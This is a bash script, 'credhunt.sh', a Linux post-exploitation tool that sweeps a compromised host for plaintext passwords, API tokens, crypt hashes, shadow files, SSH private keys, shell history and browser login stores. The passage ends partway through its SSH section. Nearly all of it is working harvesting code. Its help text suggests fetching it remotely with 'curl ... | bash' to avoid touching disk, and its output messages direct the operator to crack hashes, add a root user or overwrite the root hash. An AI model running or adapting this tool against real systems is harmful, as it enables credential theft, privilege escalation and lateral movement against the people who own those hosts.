#!/usr/bin/env bash
#
# credhunt.sh - plaintext credential hunter for Linux post-exploitation (OSCP-style)
#
# Authorized testing only. Run this on hosts you own or have written permission
# to test. It is read-only: it never writes to the target filesystem unless you
# pass -o, and it never modifies or deletes anything.
#
# Design notes:
#   * No dependencies beyond coreutils / grep / find - works on minimal boxes.
#   * POSIX-ish bash (no bash 4 features) so it runs on old targets.
#   * grep -E only (no -P) so it works where PCRE is unavailable / busybox-ish.
#   * Tiered: default = curated paths (fast), -d = whole filesystem grep (slow).
#
# Usage:  ./credhunt.sh [-o out.txt] [-q] [-d] [-r /path] [-n] [-s KB] [-H N] [-h]
#

VERSION="2.2"

# ---------------------------------------------------------------------------
# Options
# ---------------------------------------------------------------------------
OUTFILE=""          # -o  also append plain-text output here
QUICK=0             # -q  skip the slow generic grep passes
DEEP=0              # -d  grep the entire filesystem, not just curated dirs
ROOT="/"            # -r  root for deep scan
COLOR=1             # -n  disable colour
MAXSIZE_KB=2048     # -s  skip files larger than this during content greps
MAX_HITS=25         # -H  max matching lines shown per check
MAXCOL=240          # truncate long lines to this width

usage() {
    cat <<'EOF'
credhunt.sh - plaintext credential hunter for Linux (OSCP-style enumeration)

  -o FILE   tee findings to FILE (plain text, no colour codes)
  -q        quick mode: skip generic content greps, only check known cred files
  -d        deep mode: grep the whole filesystem for credential patterns (slow)
  -r PATH   scope the ENTIRE scan under PATH      (default: /)
  -s KB     skip files larger than KB during greps (default: 2048)
  -H N      max matching lines printed per check   (default: 25)
  -n        no colour
  -h        this help

You do not need to tell it where to look: with no arguments it covers the
whole box. Package-manager territory (/usr/lib, /usr/bin, /usr/share, /lib,
/var/lib/dpkg ...) and vendored trees (site-packages, dist-packages,
node_modules, vendor, .cargo, .m2 ...) are pruned everywhere, in every mode -
credentials live in files an admin wrote, not in installed libraries.
/usr/local is deliberately NOT pruned: that is hand-installed software.

  ./credhunt.sh                       # fast pass, whole box, curated locations
  ./credhunt.sh -o /dev/shm/ch.txt    # save results off-disk-ish
  ./credhunt.sh -q                    # known cred files only, very fast
  ./credhunt.sh -d                    # add a full-filesystem content grep
  ./credhunt.sh -r /mnt/loot          # scan a mounted image or subtree only

Tip: on a target, `curl http://you/credhunt.sh | bash` avoids touching disk.
EOF
}

while getopts "o:qdr:s:H:nh" opt; do
    case "$opt" in
        o) OUTFILE="$OPTARG" ;;
        q) QUICK=1 ;;
        d) DEEP=1 ;;
        r) ROOT="$OPTARG" ;;
        s) MAXSIZE_KB="$OPTARG" ;;
        H) MAX_HITS="$OPTARG" ;;
        n) COLOR=0 ;;
        h) usage; exit 0 ;;
        *) usage; exit 1 ;;
    esac
done

# Root prefix. Every path the script touches is resolved under $RP, so -r
# scopes the WHOLE scan - not just the deep sweep - and you can point it at a
# mounted disk image, a chroot, or a single subtree. With the default -r /,
# $RP is empty and every path below is the plain absolute path it looks like.
ROOT="${ROOT%/}"
[ -z "$ROOT" ] && ROOT="/"
if [ "$ROOT" = "/" ]; then RP=""; else RP="$ROOT"; fi
FSROOT="${RP:-/}"

if [ ! -d "$FSROOT" ]; then
    echo "credhunt: -r $ROOT is not a directory" >&2
    exit 1
fi

[ -t 1 ] || COLOR=0

if [ "$COLOR" -eq 1 ]; then
    C_RST=$'\033[0m'; C_SEC=$'\033[1;36m'; C_HIT=$'\033[0;33m'
    C_FILE=$'\033[1;32m'; C_CRIT=$'\033[1;31m'; C_INFO=$'\033[0;37m'
else
    C_RST=""; C_SEC=""; C_HIT=""; C_FILE=""; C_CRIT=""; C_INFO=""
fi

if [ -n "$OUTFILE" ]; then
    : > "$OUTFILE" 2>/dev/null || { echo "cannot write $OUTFILE"; exit 1; }
fi

# ---------------------------------------------------------------------------
# Output helpers - colour to stdout, plain to the log file
# ---------------------------------------------------------------------------
emit() {  # emit <colour> <text>
    printf '%s%s%s\n' "$1" "$2" "$C_RST"
    [ -n "$OUTFILE" ] && printf '%s\n' "$2" >> "$OUTFILE"
    return 0
}
sect()  { emit "$C_SEC"  ""; emit "$C_SEC" "=== $* ==="; }
sub()   { emit "$C_INFO" "--- $*"; }
file_()  { emit "$C_FILE" "  [+] $*"; }
crit()  { emit "$C_CRIT" "  [!] $*"; }
note()  { emit "$C_INFO" "      $*"; }

# Read matches from stdin, cap the count, truncate width, indent.
show() {
    local n=0 line
    while IFS= read -r line; do
        n=$((n+1))
        [ "$n" -gt "$MAX_HITS" ] && { note "... output truncated (-H to raise)"; break; }
        emit "$C_HIT" "      ${line:0:$MAXCOL}"
    done
    return 0
}

have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------------------
# Patterns
# ---------------------------------------------------------------------------
Q="\"'"   # quote characters, used inside bracket expressions

# the words that introduce a secret
KW="(pass(w(or)?d)?|passphrase|pwd|secret|api[-_]?key|apikey|access[-_]?key|secret[-_]?key|auth[-_]?token|token|bearer|creds?|credential|conn(ection)?[-_]?str(ing)?|dbpass|sa_pass)"

# a) assignment style:   password = hunter2   /   DB_PASS: "hunter2"
ASSIGN_RE="${KW}[[:space:]${Q}]*[:=][[:space:]${Q}]*[^[:space:]${Q},;)}<]{3,}"

# b) function-arg style: define('DB_PASSWORD', 'hunter2')  /  connect(host, user, 'pw')
# The optional suffix lets a compound key still match: Openfire stores its
# decryption key as 'passwordKey','EOAJUe2Sqdlfqjk'. It is an explicit short
# list rather than [A-Za-z0-9_]* because an open-ended suffix also matched
# "tokenizer', 'nltk'" and "credentials, 'see docs'". A camelCase boundary
# like [A-Z_] would not work either - these greps run with -i, which makes
# [A-Z] match lowercase as well.
KWSUF="(_?(key|keys|value|val|hash|salt|enc|encrypted|plain|text|str|string))?"
FUNCARG_RE="${KW}${KWSUF}[${Q}]?[[:space:]]*,[[:space:]]*[${Q}][^${Q}]{3,}[${Q}]"

# c) credentials embedded in a URI: mysql://user:pass@host, ftp://a:b@h, http://u:p@h
URI_RE="[a-zA-Z][a-zA-Z0-9+.-]{1,12}://[A-Za-z0-9._%+~-]{1,64}:[^@[:space:]${Q}/]{1,64}@"

# d) XML, which Java apps use heavily and which neither of the above catches:
#      <property name="password" value="s3cret"/>     (attribute pair)
#      <password>s3cret</password>                    (element text)
#    The attribute form splits the keyword and the value across two different
#    attributes, so there is no keyword-then-separator-then-value sequence to
#    match; the element form separates them with > rather than = or :.
XML_ATTR_RE="name[[:space:]]*=[[:space:]]*[${Q}][^${Q}]*${KW}[^${Q}]*[${Q}][^>]*value[[:space:]]*=[[:space:]]*[${Q}][^${Q}]{3,}[${Q}]"
XML_ELEM_RE="<[A-Za-z0-9_.:-]*${KW}[A-Za-z0-9_.:-]*>[^<[:space:]]{3,}</"

# e) prose. Notes, READMEs, to-do files and handover messages disclose
#    credentials in plain sentences:
#      Dach's password is "RefriedScabbedWasting502"
#      the password for the backup account is Summer2023!
#    Every pattern above keys off a separator; a sentence has none, so these
#    were invisible. The quoted form is high confidence on its own. The bare
#    form needs 8+ characters and is filtered by PROSE_NOISE below, which
#    rejects the English words that ordinarily follow "is" ("is required",
#    "is not set", "is case-sensitive").
PROSE_KW="(pass(word|phrase|code)?|creds?|credentials?)"
PROSE_MID="([[:space:]]+[A-Za-z0-9_'-]+){0,4}"
PROSE_VERB="[[:space:]]+(is|are|was|were)[[:space:]]+"
PROSE_RE="(${PROSE_KW}${PROSE_MID}${PROSE_VERB}[${Q}][^${Q}]{3,}[${Q}]|${PROSE_KW}${PROSE_MID}${PROSE_VERB}[^[:space:]]{8,})"

CRED_RE="(${ASSIGN_RE}|${FUNCARG_RE}|${URI_RE}|${XML_ATTR_RE}|${XML_ELEM_RE}|${PROSE_RE})"

# crypt(3) hashes: md5crypt, bcrypt, sha256/512crypt, yescrypt, apr1.
# Structured as $id$salt$hash rather than "$id$ then any chars" - the loose
# form matches runs of '$' inside binaries and buries real hits in noise.
HASH_RE="\\\$(1|2[abxy]|5|6|7|y|gy|md5|apr1|sha1)\\\$[^\$:[:space:]]{0,64}\\\$[A-Za-z0-9./]{20,}"

# Private key material. The leading dashes AND the ^ anchor both matter: a real
# PEM file starts the line with them, whereas a script that merely mentions the
# marker (this script, linpeas) has it indented or inside quotes. Without the
# anchor credhunt reported itself as a private key. Every use must pass this
# via `grep -e`, because a pattern starting with "-" is otherwise parsed as an
# option rather than a pattern.
KEY_RE="^-----BEGIN ([A-Z0-9]+ )?PRIVATE KEY-----"

# high-signal third-party token formats
TOKEN_RE="(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,})"   # key markers are KEY_RE's job

# DB/LDAP/FTP connect calls - creds are passed positionally, so no keyword to
# anchor on; flag the whole line and read it yourself.
CONNFN_RE="(mysqli?_connect|mysqli_real_connect|pg_connect|pg_pconnect|sqlsrv_connect|oci_connect|new[[:space:]]+PDO|new[[:space:]]+mysqli|ldap_bind|ftp_login|ssh2_auth_password|SqlConnection|DriverManager\.getConnection|psycopg2\.connect|pymysql\.connect|MongoClient)[[:space:]]*\("

# Positional SQL inserts, where the value has no adjacent keyword to anchor on.
# Matched on table name instead: OFPROPERTY, wp_users, accounts, settings.
# Only applied to files already identified as database dumps or data stores,
# because on its own it is far too broad for a filesystem-wide sweep.
# Only tables where EVERY row is a credential record. PROPERT/SETTING/CONFIG
# were here and had to go: matching on those table names printed every row of
# Openfire's OFPROPERTY table - 24 lines of hostnames, booleans and Java class
# names - which filled the 25-line display budget and crowded out the actual
# password. A property table's real secrets are caught by the keyword patterns
# instead, because the property KEY is called "password".
SQLINS_RE="INSERT INTO [\`\"'[]?[A-Za-z0-9_]*(USER|ADMIN|ACCOUNT|LOGIN|MEMBER|CRED|PASSWD)[A-Za-z0-9_]*"

# Lines that are almost always noise, not credentials. Two kinds of
# placeholder, because they need different anchoring.
#
# PH_EOL must occupy the whole value, anchored to end-of-line. The anchor is
# load-bearing: this filter runs on lines that already carry grep's "N:" line
# number prefix, and unanchored, that prefix colon plus a leading variable
# ("5:$link = mysql_connect(...)") reads as an empty assignment and silently
# drops a real finding.
PH_EOL="(\\\$\{?[A-Za-z_][A-Za-z_0-9]*\}?|\{\{[^}]*\}\}|<%[^%]*%>|%[sdv]|None|null|nil|true|false|\.\.\.)"
#
# PH_WORD is generic documentation filler. These are safe to match mid-line -
# they are words rather than $variables, so they cannot collide with the line
# number prefix - and they have to be, because shipped examples embed them in
# longer strings: overlayroot.conf ships "mapname=mapper,pass=foo,fstype=ext4".
# A trailing non-word character is required so "foo" does not match "foobar123".
#
# Note the trade: a box whose real password is literally "secret" or "password"
# would have that line filtered. Those are values you would spray anyway.
PH_WORD="(YOUR_[A-Z_]*|CHANGE_?ME|changeme|placeholder|xxx+|foo|foobar|bar|baz|qux|somepassword|mypassword|yourpassword|yourpasswordhere|secretpassword|secret|password|passwd|pass|value|string|default|files|compat|systemd|nis|ldap|true|false|function)"
# The English words that ordinarily follow "the password is ...". Without this
# the prose pattern fires on documentation ("password is required to be 8
# characters"). A trailing non-word character is required so that "is sent"
# does not also swallow "is sentinelPass123".
PROSE_NOISE="(is|are|was|were)[[:space:]]+[${Q}]?(required|not|never|always|set|unset|empty|blank|correct|incorrect|valid|invalid|wrong|missing|changed|expired|enforced|enabled|disabled|stored|hashed|encrypted|case|optional|mandatory|the|a|an|your|my|his|her|their|our|used|needed|available|unknown|different|same|too|now|also|only|usually|typically|generally|located|saved|kept|written|shown|displayed|visible|hidden|strong|weak|long|short|secure|insecure|safe|unsafe|sent|shared|reset|rotated|configured|defined|provided|accepted|rejected|verified|checked|cached|logged|exposed|leaked|compromised|obtained|derived|generated|created|supplied|entered|requested|prompted|transmitted|passed|taken|computed|compared|matched|returned|displayed|truncated|ignored|omitted|arbitrary|unique|identical|irrelevant|case-sensitive|writable|readable|randomly|automatically|manually|normally|optionally|securely|syntactically|[a-z]+ly[[:space:]])([^A-Za-z0-9_]|$)"
# Both placeholder rules require a credential KEYWORD before the separator, not
# just any separator. Without that, the "N:" prefix grep -n adds was itself
# being read as the separator: "2:password = Winter2023!" matched as ":" +
# the word "password", so the single most common credential form on earth was
# being silently discarded. Requiring the keyword first removes that whole
# class of collision - the prefix colon can no longer start a match.
NOISE_RE="(${PROSE_NOISE}|NOPASSWD|\*{3,}|password_hash|password_verify|PASSWORD_DEFAULT|check_password|hashed_password|pam_[a-z]+\.so|getpwnam|${KW}${KWSUF}[A-Za-z0-9_]*[[:space:]${Q}]*[:=][[:space:]${Q}]*(${PH_EOL}[[:space:]${Q};,)]*$|${PH_WORD}([^A-Za-z0-9_]|$)|\\\$[({]|\`)|>(true|false|null|none|[0-9]+|\\\$\{[^}]*\})</|value[[:space:]]*=[[:space:]]*[${Q}](\\\$\{[^}]*\}|\\\$[A-Za-z_][A-Za-z_0-9]*|%[A-Za-z_]*%|\{\{[^}]*\}\}|<%[^%]*%>)[${Q}])"

# Directory NAMES that only ever produce noise, pruned wherever they appear.
# These are vendored/third-party trees: credentials live in code an admin
# wrote, not in a library someone pip-installed.
NOISE_DIRS="site-packages dist-packages node_modules vendor __pycache__ .git .svn .hg .cache .npm .cargo .rustup .gradle .m2 gems ruby_bundle bower_components egg-info venv virtualenv terminfo locale"

# Package-manager state directories, excluded from content greps by NAME.
# grep -r can only exclude by directory name, not by path - but these names are
# distinctive enough that it works, and it matters: /var/lib/apt/lists and
# /var/lib/dpkg/info are hundreds of MB of plain text between them, and they
# are the only reason sweeping /var/lib would otherwise be expensive.
PKG_DIRS="dpkg rpm apt apt-get pacman snapd flatpak docker containerd lxc
lost+found yum dnf zypp portage emerge"

# This script, and other enumeration tools dropped alongside it, contain every
# pattern we search for - so they match themselves. credhunt was reporting
# /tmp/credhunt.sh and /tmp/linpeas.sh as files containing a private key.
SELF_EXCL=(--exclude='credhunt*' --exclude='linpeas*' --exclude='LinEnum*'
    --exclude='lse.sh' --exclude='pspy*' --exclude='linux-exploit-suggester*'
    --exclude='les.sh' --exclude='unix-privesc-check*')
case "$(basename "$0" 2>/dev/null)" in
    *.sh) SELF_EXCL+=(--exclude="$(basename "$0")") ;;
esac

# Bundled front-end libraries: an app's own web assets are full of the words we
# look for ("token = tokens[i]" in prototype.js) and never hold credentials.
# Excluded from the content sweep, with config-shaped JS grepped separately.
ASSET_EXCL=(--exclude='*.min.js' --exclude='*.min.css' --exclude='*.js'
    --exclude='*.css' --exclude='*.map' --exclude='*.scss' --exclude='*.less'
    --exclude='*.ts' --exclude='*.woff' --exclude='*.woff2' --exclude='*.eot')

# same lists, as grep --exclude-dir flags
GREP_EXCL=()
for _d in $NOISE_DIRS $PKG_DIRS; do GREP_EXCL+=(--exclude-dir="$_d"); done
GREP_EXCL+=(--exclude-dir=man --exclude-dir=doc)
unset _d

# Absolute subtrees pruned in deep mode: pseudo-filesystems plus everything
# owned by the package manager. /usr/local is deliberately NOT here - that is
# where admins install things by hand, which is exactly what we want to read.
PRUNE_PATHS="/proc /sys /dev /run /snap /lost+found
/usr/lib /usr/lib32 /usr/lib64 /usr/libexec /usr/bin /usr/sbin /usr/include
/usr/share /usr/src /lib /lib32 /lib64 /lib/modules /bin /sbin
/var/lib/docker /var/lib/dpkg /var/lib/rpm /var/lib/apt /var/lib/pacman
/var/lib/snapd /var/lib/flatpak /var/cache"

# Only for running this on a Mac while developing it. These hold roughly 78% of
# a macOS filesystem and have no Linux equivalent, so a timing taken without
# them is dominated by directories no real target has. No effect on Linux.
if [ "$(uname -s 2>/dev/null)" = "Darwin" ]; then
    PRUNE_PATHS="$PRUNE_PATHS /System /Library /Applications /Volumes /cores
/private/var/db /private/var/folders /Users/*/Library"
fi

# Build the find prune expressions once, at startup.
#   PRUNE_EXPR      - package subtrees AND vendored directory names
#   PRUNE_PATH_EXPR - subtrees only; used where a "noise" name is the target
#                     (scan_git has to be able to find .git directories)
PRUNE_EXPR=(); PRUNE_PATH_EXPR=()
for _p in $PRUNE_PATHS; do
    PRUNE_EXPR+=(-path "${RP}${_p}" -o)
    PRUNE_PATH_EXPR+=(-path "${RP}${_p}" -o)
done
NAME_PRUNE=(); ALL_PRUNE=()
for _p in $PRUNE_PATHS; do ALL_PRUNE+=(-path "${RP}${_p}" -o); done
for _d in $NOISE_DIRS; do
    PRUNE_EXPR+=(-name "$_d" -o)
    NAME_PRUNE+=(-name "$_d" -o)
    ALL_PRUNE+=(-name "$_d" -o)
done
unset "PRUNE_EXPR[${#PRUNE_EXPR[@]}-1]"
unset "PRUNE_PATH_EXPR[${#PRUNE_PATH_EXPR[@]}-1]"
unset "NAME_PRUNE[${#NAME_PRUNE[@]}-1]"
unset "ALL_PRUNE[${#ALL_PRUNE[@]}-1]"
unset _p _d

# Files that are never worth reading as text during a content sweep.
SKIP_NAMES=(
    ! -name '*.log' ! -name '*.log.*' ! -name '*.gz' ! -name '*.xz'
    ! -name '*.bz2' ! -name '*.zst' ! -name '*.so' ! -name '*.so.*'
    ! -name '*.mo' ! -name '*.po' ! -name '*.jar' ! -name '*.war'
    ! -name '*.class' ! -name '*.pyc' ! -name '*.o' ! -name '*.a'
    ! -name '*.woff*' ! -name '*.ttf' ! -name '*.png' ! -name '*.jpg'
    ! -name '*.gif' ! -name '*.svg' ! -name '*.ico' ! -name '*.pdf'
    ! -name '*.journal' ! -name '*.deb' ! -name '*.rpm'
)

# Compiler and app-server output. These are generated artifacts: a file called
# passwordProperty_tag.class is not loot, it is Tomcat having compiled a JSP.
# A real run on a TeamCity box returned ~45 of these under "names suggest
# secrets" and ~25 more under "recently modified", crowding out everything else.
GENERATED_RE='\.(class|jar|war|o|so|map|pyc|pyo|obj|lib|a|d|jsp|jspf|dll|exe|pdb|js|ts|css|log)(:|$)|/(work/Catalina|WEB-INF/(classes|lib)|target/classes|build/classes|hsperfdata[^/]*)/'

# Archives that ship inside an application install are not "archives in an
# unusual place" - TeamCity alone bundles 25+ plugin .zip files.
SWEEP_SKIP_RE='/(WEB-INF/(plugins|tags|lib)|node_modules|site-packages|\.unpacked|pluginsDslCache|configHistory)/'
BUNDLED_RE='/(webapps|WEB-INF|plugins|update|bundled|node_modules|site-packages|migration-tool|caches|configHistory|\.unpacked|devPackage|logs)/'

# Directories the default content sweep covers: everywhere an admin or an
# application writes. /var/lib matters more than its reputation suggests - it
# is where nearly every Linux service keeps its state, and service state is
# full of credentials (openfire.script, gitea's app.ini, grafana.db). The
# package-owned parts of it (/var/lib/dpkg, apt, rpm, docker, snapd) are in
# PRUNE_PATHS, so adding the parent costs little.
SWEEP_DIRS="${RP}/etc ${RP}/opt ${RP}/srv ${RP}/usr/local ${RP}/var/www
${RP}/var/lib ${RP}/var/opt ${RP}/var/local ${RP}/var/backups ${RP}/var/spool
${RP}/var/tmp ${RP}/var/mail ${RP}/home ${RP}/root ${RP}/tmp ${RP}/dev/shm
${RP}/boot ${RP}/data ${RP}/apps ${RP}/app"

# ONE filesystem walk, reused by every section that locates files by name.
# This replaced four independent walks that each re-traversed the whole disk.
#
# Populated from main() and NOT lazily on first use: every consumer calls this
# inside a pipeline, a pipeline runs in a subshell, and an assignment made
# there is lost to the parent - which would silently restore the four-walk
# behaviour while looking correct. Warming it once in the main shell is the
# whole point, so leave the call where it is.
FS_FILES=""
fs_warm() {
    FS_FILES=$(find "$FSROOT" -xdev \( "${PRUNE_EXPR[@]}" \) -prune -o \
        -type f -size -"${MAXSIZE_KB}"k -print 2>/dev/null)
}
fs_files() { printf '%s\n' "$FS_FILES"; }

# find over an explicit directory list, with vendored dirs pruned.
#   usage: dfind "<space separated dirs>" [-maxdepth N] <expression...>
# Non-existent directories are dropped rather than left for find to complain
# about, and -maxdepth/-mindepth are hoisted ahead of the prune group because
# find requires positional options before the expression.
dfind() {
    local dirs="$1"; shift
    local pre=() list=() d
    while [ "${1:-}" = "-maxdepth" ] || [ "${1:-}" = "-mindepth" ]; do
        pre+=("$1" "$2"); shift 2
    done
    for d in $dirs; do [ -d "$d" ] && list+=("$d"); done
    [ "${#list[@]}" -eq 0 ] && return 0
    find "${list[@]}" -xdev "${pre[@]}" \( "${ALL_PRUNE[@]}" \) -prune -o \
        "$@" -print 2>/dev/null
}

# Like dfind, but prunes only package subtrees - so a directory whose NAME is
# in NOISE_DIRS (.git, say) can still be the thing being searched for.
dfind_paths() {
    local dirs="$1"; shift
    local list=() d
    for d in $dirs; do [ -d "$d" ] && list+=("$d"); done
    [ "${#list[@]}" -eq 0 ] && return 0
    find "${list[@]}" -xdev \( "${PRUNE_PATH_EXPR[@]}" \) -prune -o "$@" -print 2>/dev/null
}

# Deep mode's file list, NUL-separated for `xargs -0 grep`. Batching ~1000
# files per grep instead of forking one grep per file is the difference between
# a deep sweep measured in minutes and one measured in hours. (The default
# sweep uses grep -r instead, which traverses in C and measured faster still -
# but grep -r cannot exclude by path, which deep mode needs.)
prune_find0() {
    find "$FSROOT" \( "${PRUNE_EXPR[@]}" \) -prune -o \
        -type f -size -"${MAXSIZE_KB}"k "${SKIP_NAMES[@]}" -print0 2>/dev/null
}

# Batch-grep a NUL-separated file list from stdin.
#   /dev/null is passed as a first filename so that grep never falls back to
#   reading stdin when xargs hands it an empty batch, and always prefixes
#   output with the filename even when a batch holds a single file.
xgrep() {  # xgrep <regex>
    xargs -0 grep -H -n -i -I -E "$1" /dev/null 2>/dev/null
}

# grep a list of literal paths; only prints for files that exist and match
grep_paths() {  # grep_paths <regex> <path>...
    local re="$1"; shift
    local f
    for f in "$@"; do
        [ -f "$f" ] && [ -r "$f" ] || continue
        if grep -qaiE "$re" "$f" 2>/dev/null; then
            file_ "$f"
            grep -aniE "$re" "$f" 2>/dev/null | grep -aviE "$NOISE_RE" | show
        fi
    done
}

# report a file's existence + a peek at the contents
show_file() {  # show_file <path> [lines]
    local f="$1" n="${2:-15}"
    [ -f "$f" ] && [ -r "$f" ] || return 0
    file_ "$f  ($(stat -c '%A %U:%G %s bytes' "$f" 2>/dev/null || ls -l "$f"))"
    head -n "$n" "$f" 2>/dev/null | show
}

# expand a glob safely (no matches -> nothing)
glob() { local g; for g in $1; do [ -e "$g" ] && printf '%s\n' "$g"; done; }

# ---------------------------------------------------------------------------
banner() {
    emit "$C_SEC" "#############################################################"
    emit "$C_SEC" "  credhunt.sh v$VERSION - plaintext credential hunter"
    emit "$C_INFO" "  host: $(hostname 2>/dev/null)   user: $(id -un 2>/dev/null) ($(id -u 2>/dev/null))"
    emit "$C_INFO" "  date: $(date 2>/dev/null)"
    emit "$C_INFO" "  mode: $( [ "$DEEP" -eq 1 ] && echo deep || { [ "$QUICK" -eq 1 ] && echo quick || echo normal; } )   root: $ROOT"
    emit "$C_SEC" "#############################################################"
}

# ===========================================================================
# 1. /etc/passwd, /etc/shadow and their backups
# ===========================================================================
scan_shadow() {
    sect "1. Password databases and their backups"

    if [ -r "${RP}/etc/shadow" ]; then
        crit "${RP}/etc/shadow is READABLE as $(id -un) - dump and crack it"
        awk -F: '$2 != "" && $2 != "*" && $2 !~ /^!/' ${RP}/etc/shadow 2>/dev/null \
            | head -n "$MAX_HITS" | show
    fi

    # hashes parked in ${RP}/etc/passwd itself (2nd field != x)
    if awk -F: '$2 != "x" && $2 != "*" && $2 != "" {print}' ${RP}/etc/passwd 2>/dev/null | grep -q .; then
        crit "Hash present directly in ${RP}/etc/passwd"
        awk -F: '$2 != "x" && $2 != "*" && $2 != "" {print}' ${RP}/etc/passwd 2>/dev/null | show
    fi

    # writable passwd/shadow = instant root, worth calling out
    [ -w "${RP}/etc/passwd" ] && crit "${RP}/etc/passwd is WRITABLE - add a root user with openssl passwd"
    [ -w "${RP}/etc/shadow" ] && crit "${RP}/etc/shadow is WRITABLE - overwrite the root hash"

    sub "backup copies"
    # shadow-like: readable at all is the finding.
    for f in ${RP}/etc/shadow- ${RP}/etc/shadow.bak ${RP}/etc/shadow.old ${RP}/etc/shadow.save \
             ${RP}/etc/gshadow ${RP}/etc/gshadow- ${RP}/etc/security/opasswd \
             ${RP}/var/backups/shadow.bak ${RP}/var/backups/gshadow.bak; do
        [ -r "$f" ] || continue
        crit "readable: $f"
        awk -F: '$2 != "" && $2 != "*" && $2 !~ /^!/' "$f" 2>/dev/null | head -n 10 | show
    done
    # passwd-like: /etc/passwd- is world-readable on every Debian box, so its
    # being readable is not a finding. Only a real hash in field 2 is.
    for f in ${RP}/etc/passwd- ${RP}/etc/passwd.bak ${RP}/etc/passwd.old \
             ${RP}/var/backups/passwd.bak ${RP}/var/backups/group.bak; do
        [ -r "$f" ] || continue
        if awk -F: '$2 != "x" && $2 != "*" && $2 != "" && $2 !~ /^!/' "$f" 2>/dev/null | grep -q .; then
            crit "hash present in $f"
            awk -F: '$2 != "x" && $2 != "*" && $2 != "" && $2 !~ /^!/' "$f" 2>/dev/null | head -n 10 | show
        fi
    done
    glob "${RP}/var/backups/*.bak" | while IFS= read -r f; do [ -r "$f" ] && note "also: $f"; done

    sub "loose crypt(3) hashes in ${RP}/etc, ${RP}/opt, ${RP}/srv, ${RP}/home, ${RP}/var/www"
    grep -rniIE "$HASH_RE" ${RP}/etc ${RP}/opt ${RP}/srv ${RP}/home ${RP}/var/www "${GREP_EXCL[@]}" 2>/dev/null \
        | grep -avE "^${RP}/etc/(shadow|passwd|gshadow)" \
        | grep -aviE "$NOISE_RE" | show
}

# ===========================================================================
# 2. Per-user credential stores and dotfiles
# ===========================================================================
scan_userfiles() {
    sect "2. User credential stores (dotfiles)"

    local homes
    homes=$( { echo ${RP}/root; awk -F: '$3>=1000 || $3==0 {print $6}' ${RP}/etc/passwd 2>/dev/null; \
               ls -d ${RP}/home/* 2>/dev/null; } | sort -u )

    local h f
    for h in $homes; do
        [ -d "$h" ] || continue
        for f in .netrc _netrc .git-credentials .pgpass .my.cnf .s3cfg .npmrc .pypirc \
                 .rediscli_auth .dbeaver-data-sources.xml .msmtprc .fetchmailrc \
                 .esmtprc .irssi/config .weechat/irc.conf .subversion/auth \
                 .config/rclone/rclone.conf .config/filezilla/filezilla.xml \
                 .config/filezilla/recentservers.xml .config/filezilla/sitemanager.xml \
                 .aws/credentials .aws/config .azure/accessTokens.json \
                 .config/gcloud/credentials.db .docker/config.json \
                 .kube/config .config/hub .gem/credentials .composer/auth.json \
                 .config/openvpn/auth.txt .vnc/passwd .smbcredentials .cifs \
                 .ldaprc .odbc.ini .env .env.local .htpasswd; do
            show_file "$h/$f" 20
        done

        # anything obviously named like a secret in the home tree
        find "$h" -maxdepth 4 -type f \( \
              -iname '*cred*' -o -iname '*passw*' -o -iname '*secret*' \
           -o -iname '*.kdbx' -o -iname '*.kdb' -o -iname '*.psafe3' \
           -o -iname '*vault*' -o -iname 'notes*.txt' -o -iname 'todo*.txt' \
           -o -iname '*.ovpn' -o -iname '*.pem' -o -iname '*.ppk' -o -iname '*.jks' \
           -o -iname '*.keytab' -o -iname '*.pfx' -o -iname '*.p12' \) \
           2>/dev/null | grep -avE '/(\.cache|\.mozilla/firefox/[^/]*/(cache|storage))/' | show
    done

    sub "browser-stored credentials (loot, needs offline decryption)"
    glob "${RP}/root/.mozilla/firefox/*/logins.json" | show
    glob "${RP}/home/*/.mozilla/firefox/*/logins.json" | show
    glob "${RP}/home/*/.config/*/Login Data" | show
    glob "${RP}/root/.config/*/Login Data" | show

    sub "GNOME keyring / kwallet blobs"
    glob "${RP}/home/*/.local/share/keyrings/*" | show
    glob "${RP}/home/*/.local/share/kwalletd/*" | show
}

# ===========================================================================
# 3. History files - the single highest-yield source on OSCP boxes
# ===========================================================================
scan_history() {
    sect "3. Shell and tool history"

    local hist
    hist=$( { glob "${RP}/root/.*history"; glob "${RP}/home/*/.*history"; \
              glob "${RP}/root/.*_history"; glob "${RP}/home/*/.*_history"; \
              glob "${RP}/home/*/.local/share/fish/fish_history"; \
              glob "${RP}/root/.local/share/fish/fish_history"; \
              glob "${RP}/home/*/.viminfo"; glob "${RP}/root/.viminfo"; \
              glob "${RP}/home/*/.lesshst"; glob "${RP}/root/.lesshst"; \
              glob "${RP}/home/*/.config/*/history"; \
              echo ${RP}/var/log/wtmp.hist; } | sort -u )

    local f
    for f in $hist; do
        [ -f "$f" ] && [ -r "$f" ] || continue
        file_ "$f"
        # commands that leak secrets on the command line
        grep -aniE "(pass|pwd|secret|token|key|cred|-p[[:space:]]*[^[:space:]-]|--password|mysql|psql|mongo|redis-cli|ssh|scp|sshpass|curl.*-u|wget.*--(user|password)|smbclient|impacket|net use|export .*=|echo .*\|)" "$f" 2>/dev/null \
            | grep -aviE "$NOISE_RE" | show
    done

    sub "history files linked to /dev/null (anti-forensics; check anyway)"
    for f in $hist; do
        [ -L "$f" ] && note "$f -> $(readlink "$f")"
    done
}

# ===========================================================================
# 4. SSH material
# ===========================================================================
scan_ssh() {
    sect "4. SSH keys and configs"

    sub "private keys"
    { glob "${RP}/root/.ssh/*"; glob "${RP}/home/*/.ssh/*"; glob "${RP}/etc/ssh/*key"; \
      glob "${RP}/var/lib/*/.ssh/*"; } | while IFS= read -r f; do
        [ -f "$f" ] && [ -r "$f" ] || continue
        if head -c 200 "$f" 2>/dev/null | grep -qaE -e "$KEY_RE"; then
            if head -c 400 "$f" 2>/dev/null | grep -qa "ENCRYPTED"; then
                file_ "$f  (passphrase-protected -> ssh2john)"
            else
                crit "$f  (UNENCRYPTED private key - usable as-is)"
            fi
        fi
    done

    sub "authorized_keys / known_hosts (lateral movement targets)"
    { glob "${RP}/root/.ssh/authorized_keys*"; glob "${RP}/home/*/.ssh/authorized_keys*"; } \
        | while IFS= read -r f; do [ -r "$f" ] && { file_ "$f"; head -n 5 "$f" | cut -c1-100 | show; }; done

    sub "ssh_config / sshd_config credential-ish settings"
    # These files ship with every setting present but commented out, which
